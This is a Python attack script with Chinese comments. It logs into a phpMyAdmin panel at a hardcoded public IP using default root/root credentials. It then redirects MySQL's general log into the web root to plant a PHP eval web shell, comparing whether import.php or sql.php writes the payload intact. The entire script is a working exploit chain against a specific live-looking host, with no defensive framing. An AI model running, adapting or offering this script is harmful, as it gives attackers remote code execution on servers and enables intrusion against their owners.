#!/usr/bin/env python3
"""决定性实验: 对比 import.php vs sql.php 执行, 验证 payload 是否被剥"""
import urllib.request, http.cookiejar, re, urllib.parse

B = "http://81.70.245.25/phpmyadmin/"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
html = op.open(B, timeout=10).read().decode("utf-8", "ignore")
tok = re.search(r'name="token" value="([a-f0-9]{32})"', html).group(1)
data = f"pma_username=root&pma_password=root&server=1&token={tok}".encode()
op.open(urllib.request.Request(B + "index.php", data=data), timeout=10).read()

def sql_import(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "import.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

def sql_sql(q):
    qq = urllib.parse.urlencode({"token": tok, "sql_query": q, "ajax_request": "true", "db": "mysql"})
    r = op.open(urllib.request.Request(B + "sql.php?" + qq, data=b""), timeout=15)
    return r.read().decode("utf-8", "ignore")

# 实验1: import.php 写 payload 到 t2.php
print("=== import.php: 写 t2.php ===")
sql_import("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/t2.php'")
sql_import("SET GLOBAL general_log = 'ON'")
r1 = sql_import("SELECT '<?php @eval($_POST[x]);?>'")
print("  写入:", "OK" if "error" not in r1.lower()[:300] else r1[:200])
sql_import("SET GLOBAL general_log = 'OFF'")
print("  import.php 响应:", r1[:200].replace("\n", " "))

# 实验2: 看 t2.php 是否被剥
import time
time.sleep(1)
r2 = sql_import("SELECT LOAD_FILE('C:/phpStudy/WWW/t2.php')")
print("  t2.php LOAD_FILE 含eval:", "@eval" in r2, "| 含POST:", "_POST" in r2)

# 实验3: sql.php 写 payload 到 t3.php
print("=== sql.php: 写 t3.php ===")
sql_sql("SET GLOBAL general_log_file = 'C:/phpStudy/WWW/t3.php'")
sql_sql("SET GLOBAL general_log = 'ON'")
r3 = sql_sql("SELECT '<?php @eval($_POST[x]);?>'")
sql_sql("SET GLOBAL general_log = 'OFF'")
print("  sql.php 响应:", r3[:200].replace("\n", " "))
time.sleep(1)
r4 = sql_sql("SELECT LOAD_FILE('C:/phpStudy/WWW/t3.php')")
print("  t3.php LOAD_FILE 含eval:", "@eval" in r4, "| 含POST:", "_POST" in r4)
